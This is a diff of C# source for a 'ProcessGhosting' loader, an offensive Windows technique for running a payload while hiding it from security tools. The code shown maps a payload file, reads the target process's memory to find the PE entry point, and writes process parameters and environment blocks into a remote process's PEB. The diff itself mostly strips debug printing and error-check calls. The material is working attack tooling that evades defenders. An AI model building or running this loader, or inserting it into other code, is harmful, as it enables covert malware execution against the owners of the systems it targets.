@@ -35,12 +35,6 @@ namespace ProcessGhosting
             public UNICODE_STRING CommandLine;
         }
 
-        [DllImport("kernel32.dll")]
-        static extern uint GetLastError();
-
-        [DllImport("kernel32.dll")]
-        static extern void SetLastError(uint ErrorCode);
-
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);
 
@@ -97,12 +91,9 @@ namespace ProcessGhosting
             IntPtr mapping = CreateFileMapping(fileHandle, IntPtr.Zero, FileMapProtection.PageReadonly, (uint)0, (uint)0, String.Empty);
 
             IntPtr rawDataPointer = MapViewOfFileEx(mapping, FileMapAccessType.Read, 0, 0, UIntPtr.Zero, IntPtr.Zero);
-            Console.WriteLine("Raw Data Pointer");
-            Console.WriteLine(rawDataPointer);
 
             //long size;
             GetFileSizeEx(fileHandle, out size);
-            Console.WriteLine("File Size : "+size);
 
             IntPtr localCopyAddress = VirtualAlloc(IntPtr.Zero, (uint)size, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
             //byte[] temp = BitConverter.GetBytes((UInt32)rawDataPointer);
@@ -122,19 +113,15 @@ namespace ProcessGhosting
             ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
 
             IntPtr payloadBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-            Console.WriteLine("Payload Base : 0x{0:X}", payloadBase.ToString("X"));
 
             byte[] data = new byte[0x200];
             ReadProcessMemory(hProcess, payloadBase, data, data.Length, out nRead);
 
             uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
-            Console.WriteLine("e_lfanew at : 0x{0:X}", e_lfanew_offset.ToString("X"));
             uint opthdr = e_lfanew_offset + 0x28;
             uint entryPoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
-            Console.WriteLine("entry Point rva at : 0x{0:X}", entryPoint_rva.ToString("X"));
 
             IntPtr addressOfEntryPoint = (IntPtr)(entryPoint_rva + (UInt64)payloadBase);
-            Console.WriteLine("Address of Enptry Point : 0x{0:X}", addressOfEntryPoint.ToString("X"));
 
             return addressOfEntryPoint;
         }
@@ -214,17 +201,14 @@ namespace ProcessGhosting
             //Read Desktopinfo 
 
             Int64 test = Marshal.ReadInt64(deskInfoPtr + 0x636);
-            Console.WriteLine("Desktopinfo value : 0x{0:X}" , test);
         }
  
         unsafe public static IntPtr SetupProcessParameters(IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
         {
             IntPtr temp = bi.PebAddress;
-            Console.WriteLine("[+] PEB Base                      : 0x" + string.Format("{0:X}", temp.ToInt64()));
     
             Int32 CommandLine = 0x70;
             Int32 ReadSize = 0x8;
-            SetLastError(0);
             UInt64 ProcParams;
 
             //RTL_USER_PROCESS_PARAMETERS unicode string params
@@ -263,23 +247,16 @@ namespace ProcessGhosting
             }
 
             uint buffer_size = (uint)(buffer_end - buffer.ToInt64());
-            //VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
             VirtualAllocEx(hProcess, buffer, buffer_size, (int)(AllocationType.Commit | AllocationType.Reserve), (int)(MemoryProtection.ReadWrite));
-            SetLastError(0);
             writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
-            Console.WriteLine("pProcparam : 0x{0:X}", pProcParams.ToInt64());
-            Console.WriteLine("Env Size : 0x{0:X}", EnvSize);
-            Console.WriteLine("Env Pointer: 0x{0:X}", EnvPtr.ToInt64());
+
             writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);
-            SetLastError(0);
             //Writing params in blocks
 
             VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
-            Console.WriteLine("Check Error : " + GetLastError());
             writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
             
             VirtualAllocEx(hProcess, EnvPtr, (uint)EnvSize, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
-            Console.WriteLine("Check error 2 : " + GetLastError());
             writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);
 
             //Set params in peb
